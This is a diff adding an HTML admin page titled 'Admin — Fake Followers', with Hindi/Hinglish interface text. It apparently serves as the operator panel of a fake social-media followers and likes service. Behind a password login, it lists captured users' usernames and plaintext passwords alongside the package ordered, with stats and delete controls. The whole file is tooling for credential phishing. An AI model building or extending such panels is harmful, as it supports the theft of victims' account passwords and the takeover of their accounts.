@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Admin — Fake Followers</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,Arial,sans-serif}
+  body{background:#070b16;color:#e8ecf5;min-height:100vh;padding:24px 16px}
+  .box{max-width:900px;margin:0 auto}
+  h1{font-size:24px;background:linear-gradient(90deg,#22d3ee,#f472b6);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .top{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:18px}
+  a,button{cursor:pointer}
+  .btn{border:1px solid #1e2a4a;background:#0f1629;color:#cbd5e1;padding:9px 16px;border-radius:10px;text-decoration:none;font-size:14px}
+  .btn:hover{border-color:#22d3ee;color:#22d3ee}
+  .red{background:#ef4444;border-color:#ef4444;color:#fff}
+  .login{max-width:340px;margin:12vh auto;background:#0f1629;border:1px solid #1e2a4a;border-radius:16px;padding:26px}
+  .login input{width:100%;padding:12px;margin:14px 0 8px;border-radius:10px;border:1px solid #1e2a4a;background:#070b16;color:#fff}
+  .login .go{width:100%;padding:12px;border:0;border-radius:10px;background:#22d3ee;color:#021;font-weight:700}
+  .err{color:#fb7185;font-size:13px;min-height:18px}
+  .stats{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+  .stat{background:#0f1629;border:1px solid #1e2a4a;border-radius:12px;padding:12px 18px}
+  .stat b{display:block;font-size:22px;color:#22d3ee}
+  table{width:100%;border-collapse:collapse;background:#0f1629;border-radius:12px;overflow:hidden}
+  th,td{padding:12px;text-align:left;font-size:14px;border-bottom:1px solid #1e2a4a}
+  th{color:#22d3ee;background:#0c1224}
+  td button{background:none;border:0;color:#fb7185;font-size:16px}
+  .wrap{overflow-x:auto}
+  #panel{display:none}
+</style>
+</head>
+<body>
+<div class="login" id="login">
+  <h1>🔐 Admin Login</h1>
+  <input type="password" id="pw" placeholder="Password">
+  <div class="err" id="err"></div>
+  <button class="go" id="go">Login</button>
+</div>
+
+<div class="box" id="panel">
+  <div class="top">
+    <h1>Saved Users</h1>
+    <div><a class="btn" href="/">← Website</a> <button class="btn" id="refresh">Refresh</button> <button class="btn red" id="clear">Sab delete</button></div>
+  </div>
+  <div class="stats">
+    <div class="stat"><b id="sTotal">0</b>Total</div>
+    <div class="stat"><b id="sF">0</b>Followers orders</div>
+    <div class="stat"><b id="sL">0</b>Likes orders</div>
+  </div>
+  <div class="wrap"><table>
+    <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Package</th><th>Time</th><th></th></tr></thead>
+    <tbody id="rows"></tbody>
+  </table></div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+let token=sessionStorage.getItem('adm')||'';
+const H=()=>({Authorization:'Bearer '+token});
+
+async function login(){
+  const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:$('pw').value})});
+  const j=await r.json();
+  if(!r.ok){$('err').textContent=j.error;return}
+  token=j.token;sessionStorage.setItem('adm',token);show();
+}
+async function show(){
+  const r=await fetch('/api/orders',{headers:H()});
+  if(!r.ok){sessionStorage.removeItem('adm');token='';$('login').style.display='block';$('panel').style.display='none';return}
+  const list=await r.json();
+  $('login').style.display='none';$('panel').style.display='block';
+  $('sTotal').textContent=list.length;
+  $('sF').textContent=list.filter(o=>o.pack.endsWith('Followers')).length;
+  $('sL').textContent=list.filter(o=>o.pack.endsWith('Likes')).length;
+  const tb=$('rows');tb.innerHTML='';
+  if(!list.length){tb.innerHTML='<tr><td colspan="6">Abhi koi data nahi</td></tr>';return}
+  list.forEach((o,i)=>{
+    const tr=document.createElement('tr');
+    [i+1,o.username,o.password,o.pack,new Date(o.time).toLocaleString()].forEach(v=>{const td=document.createElement('td');td.textContent=v;tr.appendChild(td)});
+    const td=document.createElement('td');const b=document.createElement('button');b.textContent='🗑';
+    b.onclick=async()=>{await fetch('/api/orders?id='+o.id,{method:'DELETE',headers:H()});show()};
+    td.appendChild(b);tr.appendChild(td);tb.appendChild(tr);
+  });
+}
+$('go').onclick=login;
+$('pw').onkeydown=e=>{if(e.key==='Enter')login()};
+$('refresh').onclick=show;
+$('clear').onclick=async()=>{if(confirm('Sab delete karna hai?')){await fetch('/api/orders',{method:'DELETE',headers:H()});show()}};
+if(token)show();
+</script>
+</body>
+</html>
